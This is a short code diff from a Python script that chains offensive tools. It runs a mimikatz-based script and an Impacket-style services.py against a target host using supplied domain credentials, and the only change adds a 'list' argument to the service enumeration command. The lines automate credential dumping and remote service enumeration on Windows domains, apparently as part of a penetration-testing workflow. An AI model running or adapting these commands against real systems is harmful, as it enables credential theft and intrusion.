@@ -69,7 +69,7 @@ mimiCommand = (f"py {mimikatz_path} -f ./command.txt "
 os.system(mimiCommand)
 
 # Run services.py script.
-servicesCommand = (f"py {services_path} {domain}/{username}:{password}@{targetIP} >> c:\\temp\\servicesOutput.txt")
+servicesCommand = (f"py {services_path} {domain}/{username}:{password}@{targetIP} list >> c:\\temp\\servicesOutput.txt")
 os.system(servicesCommand)
 
 # Run ADUsers script.
